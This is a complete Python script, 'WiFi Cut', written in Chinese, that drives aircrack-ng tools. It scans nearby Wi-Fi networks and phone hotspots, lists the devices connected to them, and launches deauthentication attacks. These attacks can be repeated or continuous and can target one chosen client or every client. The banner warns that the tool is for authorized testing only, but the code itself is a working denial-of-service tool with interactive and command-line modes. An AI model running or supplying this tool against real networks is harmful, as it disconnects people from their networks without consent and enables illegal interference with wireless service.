#!/usr/bin/env python3
"""
WiFi Cut - Kali Linux WiFi 扫描与断开连接工具
仅用于授权的安全测试、自有网络审计与教育目的。
"""

import argparse
import csv
import os
import re
import signal
import subprocess
import sys
import tempfile
import time
from dataclasses import dataclass, field
from pathlib import Path
from typing import Dict, List, Optional, Set, Tuple

# ── 颜色 ──────────────────────────────────────────────────────────────────────
R  = "\033[91m"
G  = "\033[92m"
Y  = "\033[93m"
C  = "\033[96m"
B  = "\033[94m"
W  = "\033[97m"
GR = "\033[90m"
BD = "\033[1m"
RS = "\033[0m"

BANNER = f"""
{BD}{C}╔══════════════════════════════════════════════════════════╗
║              WiFi Cut  -  无线网络切断工具               ║
║          扫描附近 WiFi / 热点  ·  断开已连接设备         ║
╚══════════════════════════════════════════════════════════╝{RS}
{R}  ⚠  警告：仅在你拥有或已获书面授权的网络上使用！{RS}
{R}  ⚠  未经授权干扰他人网络在多数国家/地区属于违法行为。{RS}
"""


@dataclass
class Client:
    mac: str
    power: str = ""
    packets: str = ""
    bssid: str = ""


@dataclass
class Network:
    bssid: str
    channel: str
    power: str
    encryption: str
    essid: str
    clients: List[Client] = field(default_factory=list)

    @property
    def display_name(self) -> str:
        name = self.essid if self.essid else "<隐藏网络>"
        return name


# ── 工具函数 ──────────────────────────────────────────────────────────────────

def run_cmd(cmd: List[str], timeout: int = 30) -> Tuple[int, str, str]:
    try:
        r = subprocess.run(
            cmd, capture_output=True, text=True, timeout=timeout
        )
        return r.returncode, r.stdout, r.stderr
    except subprocess.TimeoutExpired:
        return -1, "", "命令超时"
    except FileNotFoundError:
        return -1, "", f"找不到命令: {cmd[0]}"


def require_root():
    if os.geteuid() != 0:
        print(f"{R}错误：需要 root 权限。请使用 sudo 运行。{RS}")
        sys.exit(1)


def check_dependencies():
    missing = []
    for tool in ("airmon-ng", "airodump-ng", "aireplay-ng", "iw"):
        code, _, _ = run_cmd(["which", tool])
        if code != 0:
            missing.append(tool)
    if missing:
        print(f"{R}缺少依赖：{', '.join(missing)}{RS}")
        print(f"{Y}在 Kali 上安装：sudo apt install aircrack-ng iw{RS}")
        sys.exit(1)


def get_wifi_interfaces() -> List[str]:
    code, out, _ = run_cmd(["iw", "dev"])
    if code != 0:
        return []
    interfaces = []
    for line in out.splitlines():
        m = re.match(r"\s*Interface\s+(\w+)", line)
        if m:
            interfaces.append(m.group(1))
    return interfaces


def kill_conflicting_processes():
    print(f"{GR}正在终止可能冲突的进程...{RS}")
    run_cmd(["airmon-ng", "check", "kill"], timeout=15)


def start_monitor(iface: str) -> str:
    """将网卡切换到 monitor 模式，返回 monitor 接口名。"""
    kill_conflicting_processes()
    code, out, err = run_cmd(["airmon-ng", "start", iface], timeout=20)
    combined = out + err

    # airmon-ng 输出形如 "monitor mode enabled on [wlan0mon]"
    m = re.search(r"\[(\w+)\]", combined)
    if m:
        return m.group(1)

    # 有些驱动直接在同一接口上启用 monitor
    code2, out2, _ = run_cmd(["iw", "dev"])
    for line in out2.splitlines():
        m2 = re.match(r"\s*Interface\s+(\w+)", line)
        if m2 and m2.group(1).startswith(iface):
            return m2.group(1)

    # 常见命名
    for candidate in (f"{iface}mon", iface):
        code3, out3, _ = run_cmd(["iw", "dev", candidate, "info"])
        if code3 == 0 and "monitor" in out3.lower():
            return candidate

    print(f"{R}无法启用 monitor 模式。输出：{combined}{RS}")
    sys.exit(1)


def stop_monitor(mon_iface: str, original_iface: str):
    print(f"{GR}正在恢复网卡模式...{RS}")
    run_cmd(["airmon-ng", "stop", mon_iface], timeout=15)
    run_cmd(["airmon-ng", "stop", original_iface], timeout=15)


def parse_airodump_csv(prefix: str) -> Tuple[Dict[str, Network], Dict[str, List[Client]]]:
    """解析 airodump-ng 生成的 CSV 文件。"""
    networks: Dict[str, Network] = {}
    clients_by_bssid: Dict[str, List[Client]] = {}

    ap_file = f"{prefix}-01.csv"
    if not os.path.exists(ap_file):
        return networks, clients_by_bssid

    with open(ap_file, "r", encoding="utf-8", errors="replace") as f:
        content = f.read()

    sections = content.split("\n\n")
    for section in sections:
        lines = [l for l in section.strip().splitlines() if l.strip()]
        if not lines:
            continue

        header = lines[0]
        if "BSSID" in header and "ESSID" in header:
            # AP 列表
            for row in csv.reader(lines[1:]):
                if len(row) < 14:
                    continue
                bssid = row[0].strip()
                if not re.match(r"^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$", bssid):
                    continue
                net = Network(
                    bssid=bssid,
                    channel=row[3].strip(),
                    power=row[8].strip(),
                    encryption=row[5].strip(),
                    essid=row[13].strip(),
                )
                networks[bssid] = net

        elif "Station MAC" in header and "BSSID" in header:
            # 客户端列表
            for row in csv.reader(lines[1:]):
                if len(row) < 6:
                    continue
                client_mac = row[0].strip()
                bssid = row[5].strip()
                if not re.match(r"^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$", client_mac):
                    continue
                if bssid == "(not associated)" or not bssid:
                    continue
                client = Client(
                    mac=client_mac,
                    power=row[3].strip() if len(row) > 3 else "",
                    packets=row[4].strip() if len(row) > 4 else "",
                    bssid=bssid,
                )
                clients_by_bssid.setdefault(bssid, []).append(client)

    for bssid, clients in clients_by_bssid.items():
        if bssid in networks:
            networks[bssid].clients = clients

    return networks, clients_by_bssid


def scan_networks(mon_iface: str, duration: int = 15) -> Dict[str, Network]:
    """扫描附近 WiFi 网络及已连接设备。"""
    tmp_dir = tempfile.mkdtemp(prefix="wificut_")
    prefix = os.path.join(tmp_dir, "scan")

    print(f"\n{C}正在扫描附近无线网络（{duration} 秒）...{RS}")
    print(f"{GR}包括普通 WiFi、路由器、手机热点（流量共享）等{RS}\n")

    proc = subprocess.Popen(
        ["airodump-ng", "--output-format", "csv", "-w", prefix, mon_iface],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )

    for i in range(duration):
        remaining = duration - i
        print(f"\r  {GR}扫描中... 剩余 {remaining:2d} 秒{RS}", end="", flush=True)
        time.sleep(1)

    proc.send_signal(signal.SIGINT)
    try:
        proc.wait(timeout=5)
    except subprocess.TimeoutExpired:
        proc.kill()

    print(f"\r  {G}扫描完成！{RS}                    ")

    networks, _ = parse_airodump_csv(prefix)

    # 清理临时文件
    for f in Path(tmp_dir).glob("*"):
        f.unlink(missing_ok=True)
    os.rmdir(tmp_dir)

    return networks


def display_networks(networks: Dict[str, Network]):
    if not networks:
        print(f"{Y}未检测到任何 WiFi 网络。请确认网卡支持 monitor 模式且附近有信号。{RS}")
        return

    sorted_nets = sorted(
        networks.values(),
        key=lambda n: int(n.power) if n.power.lstrip("-").isdigit() else -999,
        reverse=True,
    )

    print(f"\n{BD}{'─' * 78}{RS}")
    print(f"{BD}  {'序号':<4} {'名称':<22} {'BSSID':<18} {'信道':<5} {'信号':<6} {'加密':<8} {'设备数'}{RS}")
    print(f"{BD}{'─' * 78}{RS}")

    for idx, net in enumerate(sorted_nets, 1):
        enc = net.encryption[:7] if net.encryption else "?"
        power = f"{net.power} dBm" if net.power else "?"
        client_count = len(net.clients)
        marker = f"{Y}📱{RS}" if any(
            kw in net.display_name.lower()
            for kw in ("iphone", "android", "huawei", "xiaomi", "oppo", "vivo", "galaxy", "hotspot")
        ) else "  "
        print(
            f"  {C}{idx:<4}{RS} {marker}{W}{net.display_name:<20}{RS} "
            f"{GR}{net.bssid:<18}{RS} {net.channel:<5} {power:<6} {enc:<8} {client_count}"
        )

    print(f"{BD}{'─' * 78}{RS}")
    print(f"{GR}  📱 = 可能是手机热点/流量共享{RS}\n")


def display_clients(net: Network):
    print(f"\n{BD}目标网络：{W}{net.display_name}{RS} ({net.bssid})")
    print(f"{BD}{'─' * 50}{RS}")

    if not net.clients:
        print(f"{Y}  暂未检测到已连接设备（可能设备较少或扫描时间不够）{RS}")
        print(f"{GR}  仍可对 AP 广播 deauth 以断开所有客户端{RS}")
        return

    print(f"  {'序号':<4} {'设备 MAC':<20} {'信号':<8} {'数据包'}")
    print(f"  {'─' * 45}")
    for idx, client in enumerate(net.clients, 1):
        print(f"  {idx:<4} {client.mac:<20} {client.power:<8} {client.packets}")
    print()


def deauth_attack(
    mon_iface: str,
    bssid: str,
    client_mac: Optional[str] = None,
    count: int = 0,
    interval: float = 1.0,
):
    """
    发送 deauth 帧断开设备连接。
    count=0 表示持续攻击直到用户中断。
    """
    target_desc = client_mac if client_mac else "所有已连接设备"
    print(f"\n{R}{BD}▶ 正在断开：{target_desc}{RS}")
    print(f"{GR}  目标 AP：{bssid}{RS}")
    if count == 0:
        print(f"{Y}  模式：持续攻击（Ctrl+C 停止）{RS}")
    else:
        print(f"{GR}  发送 {count} 组 deauth 帧{RS}")

    cmd = ["aireplay-ng", "-0"]
    if count == 0:
        cmd.append("0")  # aireplay-ng: 0 = 持续
    else:
        cmd.append(str(count))
    cmd.extend(["-a", bssid])
    if client_mac:
        cmd.extend(["-c", client_mac])
    cmd.append(mon_iface)

    if count == 0:
        # 持续模式：循环发送
        burst = 10
        total_sent = 0
        try:
            while True:
                burst_cmd = ["aireplay-ng", "-0", str(burst), "-a", bssid]
                if client_mac:
                    burst_cmd.extend(["-c", client_mac])
                burst_cmd.append(mon_iface)
                code, out, err = run_cmd(burst_cmd, timeout=burst + 10)
                total_sent += burst
                print(f"\r  {R}已发送 deauth 帧组数：{total_sent}{RS}", end="", flush=True)
                time.sleep(interval)
        except KeyboardInterrupt:
            print(f"\n{Y}  攻击已停止。{RS}")
    else:
        code, out, err = run_cmd(cmd, timeout=count * 3 + 30)
        if code == 0:
            print(f"{G}  deauth 攻击完成。{RS}")
        else:
            print(f"{R}  攻击可能失败：{err or out}{RS}")


def interactive_mode(mon_iface: str):
    while True:
        networks = scan_networks(mon_iface, duration=15)
        display_networks(networks)

        if not networks:
            choice = input(f"{C}重新扫描? (y/n): {RS}").strip().lower()
            if choice != "y":
                break
            continue

        try:
            sel = input(f"{C}选择目标序号（0=退出）: {RS}").strip()
            if sel == "0" or not sel:
                break
            idx = int(sel)
            sorted_nets = sorted(
                networks.values(),
                key=lambda n: int(n.power) if n.power.lstrip("-").isdigit() else -999,
                reverse=True,
            )
            if idx < 1 or idx > len(sorted_nets):
                print(f"{R}无效序号{RS}")
                continue
            target = sorted_nets[idx - 1]
        except ValueError:
            print(f"{R}请输入数字{RS}")
            continue

        display_clients(target)

        print(f"{BD}断开选项：{RS}")
        print(f"  1. 断开该 WiFi 上所有设备")
        print(f"  2. 断开指定设备")
        print(f"  3. 持续断开所有设备（直到手动停止）")
        print(f"  0. 返回扫描")

        opt = input(f"{C}选择操作: {RS}").strip()

        if opt == "0":
            continue
        elif opt == "1":
            count = input(f"{C}发送 deauth 组数（默认 20）: {RS}").strip()
            count = int(count) if count.isdigit() else 20
            deauth_attack(mon_iface, target.bssid, count=count)
        elif opt == "2":
            if not target.clients:
                print(f"{Y}未检测到客户端，将断开所有设备{RS}")
                deauth_attack(mon_iface, target.bssid, count=20)
            else:
                csel = input(f"{C}选择设备序号: {RS}").strip()
                try:
                    ci = int(csel)
                    if 1 <= ci <= len(target.clients):
                        count = input(f"{C}发送 deauth 组数（默认 20）: {RS}").strip()
                        count = int(count) if count.isdigit() else 20
                        deauth_attack(
                            mon_iface,
                            target.bssid,
                            client_mac=target.clients[ci - 1].mac,
                            count=count,
                        )
                    else:
                        print(f"{R}无效序号{RS}")
                except ValueError:
                    print(f"{R}请输入数字{RS}")
        elif opt == "3":
            deauth_attack(mon_iface, target.bssid, count=0)
        else:
            print(f"{R}无效选项{RS}")


def main():
    parser = argparse.ArgumentParser(
        description="WiFi Cut - Kali WiFi 扫描与断开工具",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
示例:
  sudo python3 wifi_cut.py                    # 交互模式
  sudo python3 wifi_cut.py -i wlan0           # 指定网卡
  sudo python3 wifi_cut.py -i wlan0 --scan 30 # 扫描 30 秒
  sudo python3 wifi_cut.py -i wlan0 -b AA:BB:CC:DD:EE:FF --deauth-all
        """,
    )
    parser.add_argument("-i", "--interface", help="无线网卡接口名（如 wlan0）")
    parser.add_argument("--scan", type=int, default=15, metavar="SEC", help="扫描时长（秒）")
    parser.add_argument("-b", "--bssid", help="目标 AP 的 BSSID")
    parser.add_argument("-c", "--client", help="目标客户端 MAC（可选）")
    parser.add_argument("--deauth-all", action="store_true", help="断开 AP 上所有设备")
    parser.add_argument("--deauth-count", type=int, default=20, help="deauth 帧组数")
    parser.add_argument("--continuous", action="store_true", help="持续 deauth 直到中断")
    args = parser.parse_args()

    print(BANNER)
    require_root()
    check_dependencies()

    # 选择网卡
    ifaces = get_wifi_interfaces()
    if not ifaces:
        print(f"{R}未找到无线网卡接口{RS}")
        sys.exit(1)

    if args.interface:
        iface = args.interface
        if iface not in ifaces:
            print(f"{Y}警告：{iface} 不在检测到的接口列表 {ifaces} 中，仍尝试使用{RS}")
    else:
        print(f"{C}检测到无线网卡：{RS}")
        for i, name in enumerate(ifaces, 1):
            print(f"  {i}. {name}")
        if len(ifaces) == 1:
            iface = ifaces[0]
            print(f"{GR}自动选择：{iface}{RS}")
        else:
            sel = input(f"{C}选择网卡序号: {RS}").strip()
            try:
                iface = ifaces[int(sel) - 1]
            except (ValueError, IndexError):
                print(f"{R}无效选择{RS}")
                sys.exit(1)

    print(f"\n{G}使用网卡：{iface}{RS}")
    mon_iface = start_monitor(iface)
    print(f"{G}Monitor 模式：{mon_iface}{RS}")

    try:
        if args.bssid and (args.deauth_all or args.client or args.continuous):
            # 命令行直接攻击模式
            count = 0 if args.continuous else args.deauth_count
            deauth_attack(mon_iface, args.bssid, args.client, count=count)
        elif args.bssid:
            # 仅扫描指定网络信息
            networks = scan_networks(mon_iface, args.scan)
            if args.bssid in networks:
                display_clients(networks[args.bssid])
            else:
                print(f"{Y}未在扫描结果中找到 {args.bssid}{RS}")
        else:
            interactive_mode(mon_iface)
    finally:
        stop_monitor(mon_iface, iface)
        print(f"\n{G}完成。网卡已恢复。{RS}")


if __name__ == "__main__":
    main()
